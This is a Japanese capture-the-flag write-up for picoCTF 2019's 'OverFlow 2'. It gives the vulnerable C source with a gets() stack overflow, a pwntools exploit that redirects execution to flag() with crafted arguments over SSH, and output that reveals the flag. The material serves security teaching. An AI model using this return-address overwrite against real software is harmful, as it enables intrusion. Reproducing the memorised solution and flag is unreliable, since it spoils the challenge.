# OverFlow 2

## 問題
> 

## 解答

ソースコードはこんな感じ

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>

#define BUFSIZE 176
#define FLAGSIZE 64

void flag(unsigned int arg1, unsigned int arg2) {
  char buf[FLAGSIZE];
  FILE *f = fopen("flag.txt","r");
  if (f == NULL) {
    printf("Flag File is Missing. Problem is Misconfigured, please contact an Admin if you are running this on the shell server.\n");
    exit(0);
  }

  fgets(buf,FLAGSIZE,f);
  if (arg1 != 0xDEADBEEF)
    return;
  if (arg2 != 0xC0DED00D)
    return;
  printf(buf);
}

void vuln(){
  char buf[BUFSIZE];
  gets(buf);
  puts(buf);
}

int main(int argc, char **argv){

  setvbuf(stdout, NULL, _IONBF, 0);

  gid_t gid = getegid();
  setresgid(gid, gid, gid);

  puts("Please enter your string: ");
  vuln();
  return 0;
}
```

`vuln()`内で1回目のbofし、リターンアドレスを`flag()`の先頭アドレスに書き換える。

`flag()`内で2回目のbofし、`arg1`と`arg2`の変数の中身をそれぞれ`0xDEADBEEF`と`0xC0DED00D`に書き換えてやればよい

```python
from pwn import *                                                                        
padding = 'A'*188

arg1_addr = p32(0xDEADBEEF)
arg2_addr = p32(0xC0DED00D)

flag_addr = p32(0x080485e6)

exploit = padding + flag_addr + p32(1) + arg1_addr + arg2_addr
print(exploit)

#io = process('./vuln')
sh = ssh(host='2019shell1.picoctf.com', user='99999', password="****************")
io = sh.run("cd /problems/overflow-2_0_f4d7b52433d7aa96e72a63fdd5dcc9cc;./vuln")
io.sendline(exploit)

print(io.recvall())
```

実行する

```shell
$ python exploit.py
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
[+] Connecting to 2019shell1.picoctf.com on port 22: Done                                [*] 99999@2019shell1.picoctf.com:                                                            Distro    Ubuntu 18.04
    OS:       linux
    Arch:     amd64                                                                          Version:  4.15.0
    ASLR:     Enabled                                                                    [+] Opening new channel: 'cd /problems/overflow-2_0_f4d7b52433d7aa96e72a63fdd5dcc9cc;./vuln': Done                                                                                [+] Receiving all data: Done (321B)                                                      [*] Closed SSH channel with 2019shell1.picoctf.com                                       Please enter your string:
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
picoCTF{arg5_and_r3turn5e919413c}bash: line 1: 3992811 Segmentation fault      (core dumped) ./vuln
```